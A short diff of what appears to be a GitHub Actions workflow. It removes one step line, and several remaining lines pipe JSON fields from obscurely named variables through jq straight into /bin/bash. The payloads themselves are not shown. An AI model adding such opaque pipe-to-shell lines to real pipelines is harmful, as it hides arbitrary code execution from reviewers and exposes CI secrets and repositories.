@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$p5631" | jq -r .c591 | /bin/bash
           printf '%s' "$ygel70865" | jq -r .f1606 | /bin/bash
           echo $fvho002 | jq -r .wamq6 | /bin/bash
-          printf '%s' "$efn27" | jq -r .p8 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
